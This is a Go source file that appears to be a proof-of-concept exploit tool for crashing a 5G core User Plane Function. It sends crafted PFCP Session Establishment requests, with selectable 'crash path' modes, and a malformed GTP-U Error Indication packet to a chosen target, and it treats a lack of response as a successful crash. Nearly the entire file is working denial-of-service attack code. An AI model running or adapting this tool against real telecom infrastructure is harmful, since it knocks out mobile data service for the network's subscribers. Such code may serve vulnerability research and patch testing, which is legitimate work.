type attackBuilder func(*pfcpClient, string) (*message.SessionEstablishmentRequest, error)

func resolveTarget(target string) (string, error) {
	if strings.Contains(target, ":") {
		return target, nil
	}
	return fmt.Sprintf("%s:%d", target, defaultPFCPPort), nil
}

func main() {
	var (
		target     = flag.String("target", "127.0.0.1:8805", "UPF PFCP endpoint (host[:port])")
		nodeIPStr  = flag.String("node-ip", "10.0.0.1", "Local NodeID (IPv4)")
		dnn        = flag.String("dnn", "internet", "Network Instance / DNN")
		mode       = flag.String("mode", "fteid", "Which crash path to trigger: fteid|outer-header|qer-bitrate|dl-threshold|sdf-filter|sdf-null|sdf-oversize|gtpu-error")
		skipAssoc  = flag.Bool("skip-assoc", false, "Skip PFCP Association Setup")
		dumpHex    = flag.Bool("dump", false, "Dump crafted Session Establishment bytes")
		seidFlag   = flag.Uint64("seid", 0, "Override CP F-SEID (defaults to random)")
		gtpuTarget = flag.String("gtpu-target", "127.0.0.1:2152", "UPF GTP-U endpoint (host[:port]) for gtpu-error mode")
		teidFlag   = flag.Uint64("teid", 0, "TEID to use in gtpu-error mode")
	)
	flag.Parse()

	nodeIP := net.ParseIP(*nodeIPStr)
	if nodeIP == nil {
		log.Fatalf("invalid node-ip: %s", *nodeIPStr)
	}

	resolvedTarget, err := resolveTarget(*target)
	if err != nil {
		log.Fatalf("resolve target: %v", err)
	}

	remoteAddr, err := net.ResolveUDPAddr("udp", resolvedTarget)
	if err != nil {
		log.Fatalf("resolve UDP addr: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		log.Fatalf("dial PFCP: %v", err)
	}
	defer conn.Close()

	seid := *seidFlag
	if seid == 0 {
		rand.Seed(time.Now().UnixNano())
		seid = uint64(rand.Uint32())<<32 | uint64(rand.Uint32())
	}

	if *mode == "gtpu-error" {
		if *teidFlag == 0 {
			log.Fatalf("gtpu-error mode requires -teid to be set to a valid TEID")
		}
		if err := sendGtpuErrorCrash(*gtpuTarget, uint32(*teidFlag)); err != nil {
			log.Fatalf("send gtpu-error packet: %v", err)
		}
		log.Printf("sent malformed GTP-U Error Indication to %s (TEID=0x%x)", *gtpuTarget, uint32(*teidFlag))
		return
	}

	client := &pfcpClient{nodeIP: nodeIP, seid: seid, seq: uint32(rand.Intn(0xffffff))}

	attacks := map[string]attackBuilder{
		"fteid":        buildFteidCrash,
		"outer-header": buildOuterHeaderCrash,
		"qer-bitrate":  buildQERBitrateCrash,
		"dl-threshold": buildDroppedDLCrash,
		"sdf-filter":   buildSDFFilterCrash,
		"sdf-null":     buildSDFFilterNullCrash,
		"sdf-oversize": buildSDFFilterOversizeCrash,
	}

	builder, ok := attacks[*mode]
	if !ok {
		keys := make([]string, 0, len(attacks))
		for k := range attacks {
			keys = append(keys, k)
		}
		log.Fatalf("unknown mode %q (valid: %s)", *mode, strings.Join(keys, ","))
	}

	if !*skipAssoc {
		if err := client.sendAssociation(conn); err != nil {
			log.Printf("association setup failed: %v", err)
		} else {
			log.Printf("association setup request sent to %s", resolvedTarget)
		}
	}

	req, err := builder(client, *dnn)
	if err != nil {
		log.Fatalf("build %s request: %v", *mode, err)
	}

	payload, err := req.Marshal()
	if err != nil {
		log.Fatalf("marshal %s request: %v", *mode, err)
	}

	if *dumpHex {
		fmt.Printf("Session Establishment (%d bytes):\n%s\n", len(payload), hex.Dump(payload))
	}

	if _, err := conn.Write(payload); err != nil {
		log.Fatalf("send %s request: %v", *mode, err)
	}
	log.Printf("sent %s Session Establishment to %s (F-SEID=0x%x)", *mode, resolvedTarget, client.seid)

	_ = conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 2048)
	if n, err := conn.Read(buf); err == nil {
		fmt.Printf("received %d-byte response\n", n)
	} else if !errors.Is(err, os.ErrDeadlineExceeded) {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			log.Printf("no response within %s (expected on crash)", readTimeout)
		} else {
			log.Printf("read response: %v", err)
		}
	}
}

func sendGtpuErrorCrash(target string, teid uint32) error {
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return fmt.Errorf("resolve GTP-U target: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("dial GTP-U target: %w", err)
	}
	defer conn.Close()

	// Minimal GTP-U header
	header := make([]byte, 8)
	header[0] = 0x30 // Version 1, PT=1, no extension/seq
	header[1] = 26   // Error Indication

	payload := make([]byte, 5)
	payload[0] = 16 // Type 16 (TEID Data I)
	binary.BigEndian.PutUint32(payload[1:5], teid)

	binary.BigEndian.PutUint16(header[2:4], uint16(len(payload)))
	binary.BigEndian.PutUint32(header[4:8], teid)

	packet := append(header, payload...)

	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("write GTP-U packet: %w", err)
	}

	return nil
}
